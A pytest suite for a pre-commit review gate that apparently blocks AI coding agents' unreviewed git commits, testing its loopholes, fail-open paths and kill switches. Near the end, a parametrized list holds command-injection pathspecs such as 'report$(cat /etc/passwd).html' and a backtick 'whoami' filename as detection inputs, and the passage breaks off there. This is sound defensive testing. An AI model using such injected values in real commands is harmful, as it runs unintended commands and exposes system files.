"""Tests for precommit_review_gate — review BEFORE the commit.

Every verdict the gate can reach has a test that PRODUCES it, including the
allow paths. A suite that only proved the gate can say "blocked" would not be
able to tell a working gate from one that blocks unconditionally — and an
unconditional blocker would get switched off within the hour, which is the
same as having no gate at all.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys

import pytest

_HOOKS_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _HOOKS_DIR not in sys.path:
    sys.path.insert(0, _HOOKS_DIR)

import _lib  # noqa: E402
import file_claims as fc  # noqa: E402
import precommit_review_gate as prg  # noqa: E402
import pretooluse_bash as ptb  # noqa: E402
import record_review as rr  # noqa: E402

# GH #5886 fix-round-4: resolved at COLLECTION time (module-level, feeds a
# class-level @pytest.mark.parametrize below) via getattr with a safe
# fallback -- a bare `prg._PATHSPEC_ENV_VARS` reference here would raise
# AttributeError and abort collection of this ENTIRE test file when loaded
# against a module that predates this feature (e.g. HEAD's own
# precommit_review_gate.py, used as a RED-verification baseline), masking
# every other test's pass/fail result in that run behind one opaque
# collection error. An empty fallback makes the parametrized tests below
# collect as zero cases (never silently "pass") against such a module,
# while every other test in this file still collects and runs normally.
_PATHSPEC_ENV_VARS_FOR_TESTS = getattr(prg, "_PATHSPEC_ENV_VARS", ())


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------


def _git(repo, *args):
    env = dict(os.environ)
    env["GIT_CONFIG_NOSYSTEM"] = "1"
    env["GIT_TERMINAL_PROMPT"] = "0"
    return subprocess.run(
        ["git", "-C", str(repo), *args],
        capture_output=True,
        text=True,
        timeout=30,
        env=env,
        check=True,
    )


@pytest.fixture
def repo(tmp_path):
    """A real repo with one commit, then a pending edit to `a.py`."""
    r = tmp_path / "r"
    r.mkdir()
    _git(r, "init", "-q", "-b", "main")
    _git(r, "config", "user.email", "t@example.com")
    _git(r, "config", "user.name", "t")
    (r / "a.py").write_text("value = 1\n")
    (r / "b.py").write_text("other = 1\n")
    _git(r, "add", "a.py", "b.py")
    _git(r, "commit", "-q", "-m", "base", "--", "a.py", "b.py")
    (r / "a.py").write_text("value = 2\n")
    return r


def _record(repo_path, *extra):
    """Run record_review with enforcement ON so it really writes."""
    os.environ["CSA_ENFORCE"] = "1"
    try:
        return rr.main([str(rr.__file__), str(repo_path), "--pre-commit", *extra])
    finally:
        os.environ.pop("CSA_ENFORCE", None)


def _toplevel(repo_path):
    return _git(repo_path, "rev-parse", "--show-toplevel").stdout.strip()


# ---------------------------------------------------------------------------
# the block paths
# ---------------------------------------------------------------------------


def test_unreviewed_commit_is_blocked(sandbox, repo):
    block, reason, _detail = prg.decide(_toplevel(repo), str(repo), ["a.py"])
    assert block is True
    assert reason == prg.REASON_UNREVIEWED


def test_recorded_blockers_still_block(sandbox, repo):
    _record(repo, "--blockers", "2", "--paths", "a.py")
    block, reason, detail = prg.decide(_toplevel(repo), str(repo), ["a.py"])
    assert block is True
    assert reason == prg.REASON_BLOCKERS
    assert detail["blockers"] == 2


def test_editing_a_reviewed_path_after_the_review_re_fires_the_gate(sandbox, repo):
    """The review is keyed to CONTENT, not to a filename.

    Reviewing, then editing, then committing is the exact loophole a
    filename-keyed gate would leave open.
    """
    _record(repo, "--clean", "--paths", "a.py")
    assert prg.decide(_toplevel(repo), str(repo), ["a.py"])[0] is False

    (repo / "a.py").write_text("value = 999\n")
    block, reason, _ = prg.decide(_toplevel(repo), str(repo), ["a.py"])
    assert block is True
    assert reason == prg.REASON_UNREVIEWED


def test_reviewing_one_path_does_not_clear_a_commit_of_another(sandbox, repo):
    (repo / "b.py").write_text("other = 2\n")
    _record(repo, "--clean", "--paths", "a.py")
    block, reason, _ = prg.decide(_toplevel(repo), str(repo), ["a.py", "b.py"])
    assert block is True
    assert reason == prg.REASON_UNREVIEWED


# ---------------------------------------------------------------------------
# the allow paths (positive controls)
# ---------------------------------------------------------------------------


def test_recorded_clean_review_allows_the_commit(sandbox, repo):
    """POSITIVE CONTROL: the gate must actually open for reviewed work."""
    _record(repo, "--clean", "--paths", "a.py")
    block, reason, _ = prg.decide(_toplevel(repo), str(repo), ["a.py"])
    assert block is False, reason


def test_unrelated_agents_edits_do_not_move_the_digest(sandbox, repo):
    """The property that makes this gate survivable in a shared tree.

    Another agent editing another file must not invalidate my review, or the
    gate would deny every commit in this repo forever.
    """
    _record(repo, "--clean", "--paths", "a.py")
    (repo / "b.py").write_text("other = 12345\n")
    (repo / "c.py").write_text("brand new\n")
    assert prg.decide(_toplevel(repo), str(repo), ["a.py"])[0] is False


def test_a_brand_new_untracked_file_still_needs_a_review(sandbox, repo):
    """An untracked file produces no `git diff HEAD` output at all.

    Without folding it in explicitly, the most review-worthy change there is
    — a whole new file — would read as "nothing pending" and sail through.
    """
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    block, reason, _ = prg.decide(_toplevel(repo), str(repo), ["new_module.py"])
    assert block is True
    assert reason == prg.REASON_UNREVIEWED


def test_reviewing_a_new_file_then_editing_it_re_fires(sandbox, repo):
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    _record(repo, "--clean", "--paths", "new_module.py")
    assert prg.decide(_toplevel(repo), str(repo), ["new_module.py"])[0] is False

    (repo / "new_module.py").write_text("def thing():\n    return 999\n")
    assert prg.decide(_toplevel(repo), str(repo), ["new_module.py"])[0] is True


def test_gitignored_paths_are_not_treated_as_pending_content(sandbox, repo):
    """--exclude-standard: an ignored artifact is not reviewable content."""
    (repo / ".gitignore").write_text("build/\n")
    _git(repo, "add", ".gitignore")
    _git(repo, "commit", "-q", "-m", "ignore", "--", ".gitignore")
    (repo / "build").mkdir()
    (repo / "build" / "out.bin").write_text("generated\n")
    assert prg.pending_key(str(repo), str(repo), ["build/out.bin"]) is None


def test_no_pending_change_needs_no_review(sandbox, repo):
    """Nothing to commit for those paths -> nothing a review could look at."""
    assert prg.pending_key(str(repo), str(repo), ["b.py"]) is None
    assert prg.decide(_toplevel(repo), str(repo), ["b.py"])[0] is False


@pytest.mark.parametrize(
    "root,paths",
    [
        (None, ["a.py"]),
        ("", ["a.py"]),
        ("/nonexistent/repo", None),
        ("/nonexistent/repo", []),
    ],
)
def test_fails_open_when_it_cannot_judge(sandbox, repo, root, paths):
    """A gate that cannot determine the answer must ALLOW, never guess."""
    assert prg.decide(root, str(repo), paths)[0] is False


def test_git_failure_fails_open(sandbox, tmp_path):
    not_a_repo = tmp_path / "plain"
    not_a_repo.mkdir()
    assert prg.pending_key(str(not_a_repo), str(not_a_repo), ["a.py"]) is None
    assert prg.decide(str(not_a_repo), str(not_a_repo), ["a.py"])[0] is False


# ---------------------------------------------------------------------------
# the denial message has to be actionable
# ---------------------------------------------------------------------------


def test_denial_names_the_exact_command_that_clears_it(sandbox, repo):
    _block, reason, detail = prg.decide(_toplevel(repo), str(repo), ["a.py"])
    msg = prg.message_for(reason, detail, ["a.py"])
    assert "record_review.py --pre-commit" in msg
    assert "--paths a.py" in msg
    assert "BEFORE the commit" in msg


def test_blocker_denial_says_to_fix_not_to_re_record(sandbox, repo):
    _record(repo, "--blockers", "3", "--paths", "a.py")
    _block, reason, detail = prg.decide(_toplevel(repo), str(repo), ["a.py"])
    msg = prg.message_for(reason, detail, ["a.py"])
    assert "3 unresolved blocker(s)" in msg
    assert "Fix them" in msg


# ---------------------------------------------------------------------------
# wiring: it must actually be reachable from the dispatcher
# ---------------------------------------------------------------------------


def test_dispatcher_blocks_an_unreviewed_commit(sandbox, repo, make_payload):
    cmd = 'git commit -m "x" -- a.py'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))
    assert block is not None
    assert block.hook == prg.HOOK_NAME
    assert block.reason == prg.REASON_UNREVIEWED


def test_dispatcher_allows_a_reviewed_commit(sandbox, repo, make_payload):
    """POSITIVE CONTROL for the wiring, not just the module."""
    _record(repo, "--clean", "--paths", "a.py")
    cmd = 'git commit -m "x" -- a.py'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))
    assert block is None or block.hook != prg.HOOK_NAME


@pytest.mark.parametrize(
    "flag",
    [
        '-i -m "only reviewed"',
        '-im "only reviewed"',  # BUNDLED: git accepts it, `"-i" in argv` missed it
        '--include -m "only reviewed"',
        '--incl -m "only reviewed"',  # ABBREVIATED: git accepts unambiguous
        '--includ -m "only reviewed"',  # prefixes of a long option; exact-match
    ],  # equality alone missed every one of these (B2).
)
def test_include_flag_still_denies_an_unreviewed_staged_file(sandbox, repo, make_payload, flag):
    """`-i/--include` commits the staged index ON TOP of the named pathspec.

    Driven through the GATE, not just the path helper. The earlier version
    asserted only the helper's return value and therefore passed while the
    bundled `-im` spelling was completely broken — a lock-in test that pinned
    a half-fix. Reviewing a.py must NOT clear a commit that also lands
    secret.py.
    """
    (repo / "secret.py").write_text("s = 'EVIL'\n")
    _git(repo, "add", "secret.py")
    _record(repo, "--clean", "--paths", "a.py")  # only a.py was reviewed

    cmd = f'git commit {flag} -- a.py'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))
    assert block is not None, "unreviewed staged file slipped through"
    assert block.hook == prg.HOOK_NAME, block.hook


def test_include_flag_also_widens_the_file_claim_set(sandbox, repo, make_payload):
    """`-i` widening matters to gate 4 as well as gate 3b.

    Once the review gate is satisfied, the commit still has to CLAIM every
    path it will touch, or another agent's in-flight edit to that staged file
    is silently uncontested. This drives the reviewed-and-allowed path so gate
    4 actually runs — the gate-3b tests all deny first and never reach it.
    """
    (repo / "secret.py").write_text("s = 'EVIL'\n")
    _git(repo, "add", "secret.py")
    _record(repo, "--clean", "--paths", "a.py", "secret.py")

    cmd = 'git commit -im "x" -- a.py'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))
    assert block is None, getattr(block, "reason", None)

    live = fc.read_live_claims(str(sandbox.file_claims_dir), fc.ttl_from_env())
    claimed = {p for rec in live for p in rec.get("paths", [])}
    assert any(p.endswith("secret.py") for p in claimed), claimed


def test_non_commit_command_never_reaches_the_gate(sandbox, repo, make_payload):
    cmd = "git status --porcelain"
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))
    assert block is None


def test_review_denied_commit_does_not_take_the_commit_mutex(sandbox, repo, make_payload):
    """Ordering guard: gate 3b must run BEFORE gate 4 (file claims).

    If it ran after, an unreviewed commit would park the per-repo commit mutex
    and stall every other agent until the claim TTL expired.
    """
    cmd = 'git commit -m "x" -- a.py'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))
    assert block is not None and block.hook == prg.HOOK_NAME

    # Read the REAL ledger API. An earlier version of this test guarded the
    # call with hasattr() on a function that does not exist, so it asserted
    # `not []` and could never fail — a vacuous test is worse than none.
    live = fc.read_live_claims(str(sandbox.file_claims_dir), fc.ttl_from_env())
    assert live == [], f"a review-denied commit claimed the mutex: {live}"


# ---------------------------------------------------------------------------
# gate 3c ordering (#4670 item 3 follow-up, 2026-08-30) — dirty
# .pre-commit-config.yaml, wired in BETWEEN gate 3b and gate 4. These three
# properties are exactly what the mutation battery's H5/H28/H29 anchors plant
# defects in; each test below is what makes that anchor's mutant get CAUGHT
# IN THIS SUITE — precommit_review_mutation_battery.py's SUITE constant runs
# only this one file, so a mutant in pretooluse_bash.py needs a test HERE
# even though the same properties (H28's ordering, H29's pathspec-only scope)
# already have direct, independent coverage in the file that landed gate 3c
# itself: test_pretooluse_bash.py:1107 (no claim taken on a 3c denial) and
# :798/:1168 (pathspec-less commands never hit 3c's guard). These tests are
# not proving something previously untested at the repo level — they exist
# because the battery's own scope is single-file, and that's the real gap
# (tracked as a follow-up: widen SUITE, or accept the ~5x runtime cost of
# scanning both files per mutation), not "nothing tested these properties."
# ---------------------------------------------------------------------------


def _dirty_the_config(repo_path):
    """Commit a clean `.pre-commit-config.yaml`, then leave an uncommitted
    edit to it — the exact #4670 hazard: staging alone is not enough
    (see TestPrecommitConfigDirtyPure in test_pretooluse_bash.py), so this
    intentionally leaves the edit UNSTAGED."""
    (repo_path / ".pre-commit-config.yaml").write_text("repos: []\n")
    _git(repo_path, "add", ".pre-commit-config.yaml")
    _git(repo_path, "commit", "-q", "-m", "config", "--", ".pre-commit-config.yaml")
    (repo_path / ".pre-commit-config.yaml").write_text("repos: [1]\n")


def test_review_gate_runs_before_the_dirty_config_gate(sandbox, repo, make_payload):
    """Ordering guard (H5): gate 3b (precommit_review_gate) must run BEFORE
    gate 3c (dirty_precommit_config) — its new immediate neighbor as of CSA
    #4670 item 3.

    Constructs a commit where BOTH gates' own conditions are independently
    true: `a.py` (the `repo` fixture's own pending edit) is genuinely
    unreviewed, AND the repo's own `.pre-commit-config.yaml` has uncommitted
    changes unrelated to this commit's pathspec. If 3c ran first (or instead
    of 3b), the returned block would be "dirty-precommit-config"; the
    dispatcher must return 3b's REASON_UNREVIEWED instead.
    """
    _dirty_the_config(repo)

    cmd = 'git commit -m "x" -- a.py'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))

    assert block is not None
    assert block.hook == prg.HOOK_NAME, block.hook
    assert block.reason == prg.REASON_UNREVIEWED, block.reason


def test_dirty_config_gate_denies_before_taking_the_commit_mutex(sandbox, repo, make_payload):
    """Ordering guard (H28): gate 3c must run BEFORE gate 4 (file claims) —
    the whole point of putting 3c ahead of 4 is that a config-denied commit
    never parks the per-repo commit mutex and stalls every other agent.

    `a.py` is REVIEWED here (so gate 3b passes clean) but the repo's own
    `.pre-commit-config.yaml` is dirty and not itself named in this commit's
    pathspec, so gate 3c must deny it — and, critically, no file claim (real
    path or commit-mutex token) may be taken as a side effect of reaching
    that denial.
    """
    _record(repo, "--clean", "--paths", "a.py")
    _dirty_the_config(repo)

    cmd = 'git commit -m "x" -- a.py'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))

    assert block is not None
    assert block.hook == ptb.DIRTY_CONFIG_HOOK_NAME, block.hook
    assert block.reason == "dirty-precommit-config", block.reason

    live = fc.read_live_claims(str(sandbox.file_claims_dir), fc.ttl_from_env())
    assert live == [], f"a config-denied commit claimed the mutex: {live}"


def test_dirty_config_gate_never_fires_on_a_pathspec_less_command(sandbox, repo):
    """Scope guard (H29): gate 3c is scoped to PATHSPEC commits only (see
    `_declared_pathspec` in pretooluse_bash.py) — a pathspec-less commit is
    judged/blocked by gate 3 (check_staged_scope) already, in a different
    (and unrelated — #4091) hazard. This gate itself must never fire for
    one, even with a genuinely dirty config sitting right there — proving
    the scope guard is checked, not merely documented.
    """
    _dirty_the_config(repo)

    block = ptb._dirty_precommit_config_block(
        'git commit -m "x"', str(repo), _toplevel(repo)
    )
    assert block is None, getattr(block, "reason", None)


# ---------------------------------------------------------------------------
# record_review's own --pre-commit surface
# ---------------------------------------------------------------------------


def test_pre_commit_without_paths_records_nothing(sandbox, repo, capsys):
    _record(repo, "--clean")
    out = capsys.readouterr().out
    assert "needs --paths" in out
    assert prg.decide(_toplevel(repo), str(repo), ["a.py"])[0] is True


def test_pre_commit_with_no_pending_change_records_nothing(sandbox, repo, capsys):
    _record(repo, "--clean", "--paths", "b.py")
    out = capsys.readouterr().out
    assert "nothing to review" in out


def test_ledger_entry_uses_the_precommit_namespace(sandbox, repo):
    """Pre-commit keys must never be mistaken for a real reviewed sha.

    Asserted against the LITERAL prefix, not against `prg.PRECOMMIT_PREFIX`:
    an earlier version compared with the constant, so emptying the constant
    made the assertion `"" in text` — always true, and the namespace could
    have collapsed into the sha space undetected.
    """
    _record(repo, "--clean", "--paths", "a.py")
    text = sandbox.last_reviewed.read_text()
    root = _toplevel(repo)

    keys = [ln.split()[1] for ln in text.splitlines() if ln.startswith(root + " ")]
    assert keys, f"no ledger entry for {root} in {text!r}"
    assert all(k.startswith("precommit:") for k in keys), keys

    head = _git(repo, "rev-parse", "HEAD").stdout.strip()
    # The real HEAD must NOT have been marked reviewed by a pre-commit record.
    assert rr.head_review_outcome(str(sandbox.last_reviewed), root, head) is None


def test_paths_flag_does_not_swallow_the_target_directory(sandbox, repo):
    """`--paths a b c` is variadic; the repo positional must still resolve.

    Regression guard: a naive parser hands the first reviewed FILE back as the
    target directory and records against the wrong repo (or none at all).
    """
    argv = ["record_review.py", str(repo), "--pre-commit", "--clean", "--paths", "a.py", "b.py"]
    assert rr._positional_target(argv) == str(repo)
    assert rr._paths_from_argv(argv) == ["a.py", "b.py"]

    # The case that actually exercises the skip: NO leading positional, so the
    # parser walks into --paths and must not hand back "a.py" as the target
    # directory. Without this, the earlier assertion above passed purely
    # because it returned on argv[1] before ever reaching --paths.
    argv_no_dir = ["record_review.py", "--pre-commit", "--clean", "--paths", "a.py", "b.py"]
    assert rr._positional_target(argv_no_dir) is None
    assert rr._paths_from_argv(argv_no_dir) == ["a.py", "b.py"]

    # And with the directory placed AFTER the variadic list.
    argv_trailing = ["record_review.py", "--pre-commit", "--paths", "a.py", "--clean", str(repo)]
    assert rr._positional_target(argv_trailing) == str(repo)
    assert rr._paths_from_argv(argv_trailing) == ["a.py"]


def test_flags_after_paths_are_not_eaten_as_paths(sandbox):
    argv = ["record_review.py", "/repo", "--pre-commit", "--paths", "a.py", "--blockers", "2"]
    assert rr._paths_from_argv(argv) == ["a.py"]
    assert rr._positional_target(argv) == "/repo"


# ---------------------------------------------------------------------------
# enforcement policy still applies
# ---------------------------------------------------------------------------


def test_master_kill_switch_disables_the_whole_chain(
    sandbox, repo, make_payload, monkeypatch, enforce_marker
):
    """CSA_DISABLE_HOOKS=1 silences a run that WOULD otherwise deny.

    The enforce marker is essential: without it the run is log-only and stdout
    is empty either way, so the assertion held whether or not the kill switch
    existed. Proven vacuous by mutation (deleting the `_lib.disabled()` early
    return left the suite green); this version fails when that return is
    removed.
    """
    enforce_marker(repo)
    cmd = 'git commit -m "x" -- a.py'
    payload = json.dumps(make_payload(tool_name="Bash", command=cmd, cwd=str(repo)))

    # Control: enforcing + no kill switch -> it really does deny.
    control = subprocess.run(
        [sys.executable, os.path.join(_HOOKS_DIR, "pretooluse_bash.py")],
        input=payload,
        capture_output=True,
        text=True,
        timeout=60,
        env={**os.environ, "HOME": str(sandbox.home)},
    )
    assert "deny" in control.stdout, control.stdout

    proc = subprocess.run(
        [sys.executable, os.path.join(_HOOKS_DIR, "pretooluse_bash.py")],
        input=payload,
        capture_output=True,
        text=True,
        timeout=60,
        env={**os.environ, "HOME": str(sandbox.home), "CSA_DISABLE_HOOKS": "1"},
    )
    assert proc.returncode == 0
    assert proc.stdout.strip() == ""


def test_operator_rollback_lever_disables_only_this_gate(sandbox, repo, monkeypatch):
    """CSA_NO_PRECOMMIT_REVIEW=1 — without it the only escape is the master
    kill switch, which also drops branch-op and unscoped-commit blocking."""
    assert prg.decide(_toplevel(repo), str(repo), ["a.py"])[0] is True
    monkeypatch.setenv("CSA_NO_PRECOMMIT_REVIEW", "1")
    assert prg.decide(_toplevel(repo), str(repo), ["a.py"])[0] is False


def test_exception_inside_decide_fails_open(sandbox, repo, monkeypatch):
    """The fail-open promise, asserted against the HANDLER itself.

    The two earlier fail-open tests only exercised the early returns, so
    replacing `except Exception: return (False,...)` with `raise` left the
    suite green. This test fails when that handler is removed.
    """

    def _boom(*_a, **_kw):
        raise RuntimeError("ledger exploded")

    monkeypatch.setattr(prg.rr, "head_review_outcome", _boom)
    assert prg.decide(_toplevel(repo), str(repo), ["a.py"]) == (False, "", {})


def test_unreadable_ledger_fails_open(sandbox, repo):
    """An unreadable ledger must ALLOW: recording cannot clear it, so a deny
    there would be unclearable — the exact wedge fail-open exists to avoid."""
    sandbox.review_state_dir.mkdir(parents=True, exist_ok=True)
    # A directory where the ledger file should be: exists, cannot be read.
    (sandbox.review_state_dir / "last_reviewed").mkdir()
    assert prg.decide(_toplevel(repo), str(repo), ["a.py"])[0] is False


def test_symlinked_repo_path_still_resolves(sandbox, repo, tmp_path):
    """A repo reached through a SYMLINKED path must still be digested.

    macOS hands out temp dirs as /var/... while `rev-parse --show-toplevel`
    reports /private/var/... . Normalizing with abspath instead of realpath
    made relpath emit a garbage ../../.. path, git matched nothing, and the
    gate silently ALLOWED everything. Caught only by an end-to-end run — the
    unit tests used the same spelling on both sides and never saw it.
    """
    link = tmp_path / "linked_repo"
    link.symlink_to(repo, target_is_directory=True)
    key_direct = prg.pending_key(str(repo), str(repo), ["a.py"])
    key_linked = prg.pending_key(str(link), str(link), ["a.py"])
    assert key_direct is not None
    assert key_linked == key_direct

    # And the real toplevel spelling vs the cwd spelling must agree too.
    assert prg.pending_key(_toplevel(repo), str(link), ["a.py"]) == key_direct


def test_digest_is_the_same_from_a_subdirectory(sandbox, repo):
    """THE unclearable-wedge regression.

    The gate keys off the commit's cwd; `record_review` keys off the repo
    toplevel. Before normalization those disagreed for any commit issued from
    a subdirectory, so the gate denied and the remedy it printed recorded
    nothing at all.
    """
    sub = repo / "sub"
    sub.mkdir()
    (sub / "c.py").write_text("deep = 1\n")
    _git(repo, "add", "sub/c.py")
    _git(repo, "commit", "-q", "-m", "add sub", "--", "sub/c.py")
    (sub / "c.py").write_text("deep = 2\n")

    from_root = prg.pending_key(str(repo), str(repo), ["sub/c.py"])
    from_sub = prg.pending_key(str(repo), str(sub), ["c.py"])
    assert from_root is not None
    assert from_root == from_sub


def test_remedy_recorded_from_a_subdirectory_clears_the_gate(sandbox, repo):
    """End-to-end version of the wedge: record from one cwd, commit from another."""
    sub = repo / "sub"
    sub.mkdir()
    (sub / "c.py").write_text("deep = 1\n")
    _git(repo, "add", "sub/c.py")
    _git(repo, "commit", "-q", "-m", "add sub", "--", "sub/c.py")
    (sub / "c.py").write_text("deep = 2\n")

    _record(repo, "--clean", "--paths", "sub/c.py")
    # The commit is issued from the SUBDIRECTORY with a cwd-relative pathspec.
    assert prg.decide(_toplevel(repo), str(sub), ["c.py"])[0] is False


def test_a_git_glob_that_matches_content_is_digested_not_refused(sandbox, repo):
    """`*.py` is a real git pathspec, not just a shell glob.

    git expands it itself, so it resolves to actual content and is judged on
    that content — blocked as UNREVIEWED, never waved through, and never
    refused as unresolvable.
    """
    block, reason, _ = prg.decide(_toplevel(repo), str(repo), ["*.py"])
    assert block is True
    assert reason == prg.REASON_UNREVIEWED


@pytest.mark.parametrize("token", ["$FILES", "~/a.py", "{a,b}.py", "`ls`"])
def test_shell_expanded_pathspec_is_refused_not_waved_through(sandbox, repo, token):
    """The hook sees the command BEFORE the shell expands it.

    An unexpanded token matches nothing, so the diff is empty — which must NOT
    be read as "this commit lands nothing".
    """
    block, reason, _ = prg.decide(_toplevel(repo), str(repo), [token])
    assert block is True
    assert reason == prg.REASON_UNRESOLVABLE


def test_literal_path_matching_nothing_is_allowed_not_refused(sandbox, repo):
    """A literal path that matches nothing lands nothing — git refuses it.

    Denying here would be a pure false positive: it broke ten existing
    dispatcher tests that use fabricated fixture paths, while closing no hole
    that git does not already close itself.
    """
    assert prg.decide(_toplevel(repo), str(repo), ["no_such_file.py"])[0] is False


def test_log_only_when_project_not_opted_in(sandbox, repo, make_payload, monkeypatch):
    """Without the project opt-in marker, the gate logs but never denies."""
    monkeypatch.delenv("CSA_ENFORCE", raising=False)
    assert _lib.enforcing(str(repo)) is False
    cmd = 'git commit -m "x" -- a.py'
    payload = json.dumps(make_payload(tool_name="Bash", command=cmd, cwd=str(repo)))
    proc = subprocess.run(
        [sys.executable, os.path.join(_HOOKS_DIR, "pretooluse_bash.py")],
        input=payload,
        capture_output=True,
        text=True,
        timeout=60,
        env={**os.environ, "HOME": str(sandbox.home)},
    )
    assert proc.returncode == 0
    assert "permissionDecision" not in proc.stdout


def test_enforcing_project_actually_denies(sandbox, repo, make_payload, enforce_marker):
    enforce_marker(repo)
    cmd = 'git commit -m "x" -- a.py'
    payload = json.dumps(make_payload(tool_name="Bash", command=cmd, cwd=str(repo)))
    proc = subprocess.run(
        [sys.executable, os.path.join(_HOOKS_DIR, "pretooluse_bash.py")],
        input=payload,
        capture_output=True,
        text=True,
        timeout=60,
        env={**os.environ, "HOME": str(sandbox.home)},
    )
    assert proc.returncode == 0
    assert "deny" in proc.stdout
    assert "precommit_review_gate" in proc.stdout


# ---------------------------------------------------------------------------
# round-2 review regressions
# ---------------------------------------------------------------------------


def test_mixed_literal_and_shell_token_is_refused(sandbox, repo):
    """A MIXED pathspec must not be cleared by reviewing its literal half.

    `-- a.py $FILES` digests exactly the same bytes as `-- a.py` alone (the
    unexpanded token contributes nothing to the diff), so checking
    unresolvable() only on an empty diff let the $FILES half land unreviewed.
    """
    _record(repo, "--clean", "--paths", "a.py")
    assert prg.decide(_toplevel(repo), str(repo), ["a.py"])[0] is False  # control

    block, reason, _ = prg.decide(_toplevel(repo), str(repo), ["a.py", "$FILES"])
    assert block is True
    assert reason == prg.REASON_UNRESOLVABLE


def test_remedy_command_survives_a_real_shell(sandbox, repo):
    """Paths with spaces must be quoted, or the printed remedy is unrunnable.

    Unquoted, one path split into three argv entries: the recording silently
    matched nothing, reported "no pending change vs HEAD", and the deny became
    permanently unclearable while explaining itself wrongly.
    """
    import shlex

    name = "data/home depot purchase history.csv"
    (repo / "data").mkdir(exist_ok=True)
    (repo / name).write_text("a,b\n")

    cmd = prg.record_command([name], str(repo))
    argv = shlex.split(cmd)
    assert name in argv, argv
    # And the repo positional survives too.
    assert str(repo) in argv, argv


def test_staged_paths_from_a_subdirectory_are_not_rebased(sandbox, repo, make_payload):
    """The two coordinate systems must not be conflated.

    Pathspec tokens are cwd-relative; staged-index paths are already
    repo-root-relative. Treating both as cwd-relative re-based the staged half
    onto the subdirectory (`pkg/secret.py` -> `pkg/pkg/secret.py`), matched
    nothing, and silently ALLOWED an unreviewed file.
    """
    sub = repo / "pkg"
    sub.mkdir()
    (sub / "mod.py").write_text("m = 1\n")
    _git(repo, "add", "pkg/mod.py")
    _git(repo, "commit", "-q", "-m", "add pkg", "--", "pkg/mod.py")
    (sub / "mod.py").write_text("m = 2\n")
    (sub / "secret.py").write_text("s = 'EVIL'\n")
    _git(repo, "add", "pkg/secret.py")

    cmd = 'git commit -im "x" -- mod.py'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(sub))
    targets = ptb._review_target_paths(ev, cmd, str(sub), None, _toplevel(repo))
    assert "pkg/secret.py" in targets, targets
    assert "pkg/pkg/secret.py" not in targets, targets

    # And drive the GATE itself: reviewing only mod.py must NOT clear a commit
    # that also lands the staged secret.py. Asserting the helper alone let the
    # dispatcher keep passing the wrong coordinate frame undetected.
    _record(repo, "--clean", "--paths", "pkg/mod.py")
    block, _detail = ptb.resolve_block(ev, cmd, str(sub))
    assert block is not None, "unreviewed staged file slipped through from a subdirectory"
    assert block.hook == prg.HOOK_NAME, block.hook


def test_non_ascii_untracked_file_digests_its_contents(sandbox, repo):
    """Without -z, git C-quotes the name, open() fails, and EVERY version of
    the file digests to the same literal "<unreadable>" — review once, rewrite
    freely, gate still says reviewed."""
    name = "caf\u00e9.py"
    (repo / name).write_text("v = 1\n")
    first = prg.pending_key(str(repo), str(repo), [name])
    (repo / name).write_text("v = 999999  # unreviewed\n")
    second = prg.pending_key(str(repo), str(repo), [name])
    assert first is not None and second is not None
    assert first != second, "content change did not move the digest"


def test_rollback_lever_is_named_in_the_denial(sandbox, repo):
    """The lever is only useful if the deny actually tells you about it."""
    _block, reason, detail = prg.decide(_toplevel(repo), str(repo), ["a.py"])
    msg = prg.message_for(reason, detail, ["a.py"], str(repo))
    assert "CSA_NO_PRECOMMIT_REVIEW=1" in msg


def test_lever_only_accepts_exactly_one(sandbox, repo, monkeypatch):
    """A truthy-looking value must not disable a safety gate by accident."""
    for value in ("0", "true", "yes", ""):
        monkeypatch.setenv("CSA_NO_PRECOMMIT_REVIEW", value)
        assert prg.decide(_toplevel(repo), str(repo), ["a.py"])[0] is True, value
    monkeypatch.setenv("CSA_NO_PRECOMMIT_REVIEW", "1")
    assert prg.decide(_toplevel(repo), str(repo), ["a.py"])[0] is False


def test_bare_record_with_no_outcome_still_satisfies_the_gate(sandbox, repo):
    """Documented policy, pinned so it cannot be inverted silently.

    A bare `--pre-commit --paths ...` records an UNKNOWN outcome; the gate's
    question is "was this reviewed at all", so unknown opens it. If that
    policy is ever changed, this test must be changed deliberately.
    """
    _record(repo, "--paths", "a.py")
    assert prg.decide(_toplevel(repo), str(repo), ["a.py"])[0] is False


def test_deletion_only_pathspec_is_reviewable(sandbox, repo):
    """Deleting a tracked file is real, reviewable content."""
    (repo / "b.py").unlink()
    block, reason, _ = prg.decide(_toplevel(repo), str(repo), ["b.py"])
    assert block is True
    assert reason == prg.REASON_UNREVIEWED
    _record(repo, "--clean", "--paths", "b.py")
    assert prg.decide(_toplevel(repo), str(repo), ["b.py"])[0] is False


# ---------------------------------------------------------------------------
# round-3 review regressions (B1 LEAK, B2 LEAK, B3 WEDGE)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command,expected",
    [
        ('git commit -m "x" -- report$(cat /etc/passwd).html', True),
        ("git commit -m 'x' -- `whoami`.txt", True),
        ('git commit -m "x" -- "report (1).html"', False),  # double-quoted: safe
        ("git commit -m 'x' -- 'report (1).html'", False),  # single-quoted: safe
        ('git commit -m "x" -- a.py', False),  # nothing suspicious at all
        ('git commit -m "$(date)" -- a.py', False),  # quoted, before --: safe
        ('git commit -m "x"', False),  # no bare `--` at all
        # Unquoted, BEFORE the first `--`: False by design (the scan only
